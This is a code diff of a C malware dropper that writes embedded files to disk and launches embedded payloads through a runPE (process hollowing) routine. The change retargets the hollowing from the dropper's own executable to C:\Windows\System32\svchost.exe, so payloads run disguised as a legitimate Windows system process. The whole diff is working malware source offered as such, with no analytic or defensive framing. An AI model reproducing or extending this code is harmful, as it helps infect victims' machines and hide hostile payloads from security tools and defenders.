@@ -4,12 +4,12 @@
 #include "runPE.h"
 #include "payloads.h"
 
-int main() {
-	TCHAR szFilePath[1024];
+int main() {	
 	FILE *currentDropfile;
 	
-	// Retrieve path to current module
-	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);	
+	// Designate hollowing target and desired current directory
+	char target[] = "C:\\Windows\\System32\\svchost.exe";
+	char desiredCurrentDirectory[] = "C:\\Windows\\System32";
 	
 	// Iterate dropfiles
 	for(int i=0; i < dropfileCount; i++) {		
@@ -26,14 +26,14 @@ int main() {
 		// Drop file on destination
 		printf("Attempting to drop file %d, file size is %ld, destination is '%s'\n", i, dropfileSizes[i], (char *) dropfileDestinations[i]);				
 		if(access((char *) dropfileDestinations[i], F_OK) == 0) {
-			printf("Desired file already exists. Skip dropping.\n");
+			printf("File with desired name already exists or no write permission on destination. Skip dropping.\n");
 		} else {
 			currentDropfile = fopen((char *) dropfileDestinations[i], "wb");
 			if(fwrite(dropfiles[i], dropfileSizes[i], 1, currentDropfile)) {
 				printf("Success.\n");
 			}	
-			fclose(currentDropfile);				
-		}				
+			fclose(currentDropfile);
+		}									
 	}	
 	
 	// Iterate payloads
@@ -49,8 +49,8 @@ int main() {
 		}
 				
 		// Spawn payloads as runPE
-		printf("\n Spawning payload %d, command line is '%s'\n", i, (char *) commandLines[i]);		
-		newRunPE(LPSTR(szFilePath), payloads[i], LPTSTR(commandLines[i]));			
+		printf("\n Instanciating payload %d as svchost.exe, command line is '%s'\n", i, (char *) commandLines[i]);			
+		newRunPE(target, desiredCurrentDirectory, payloads[i], LPTSTR(commandLines[i]));			
 	}
 				
 	return 0;
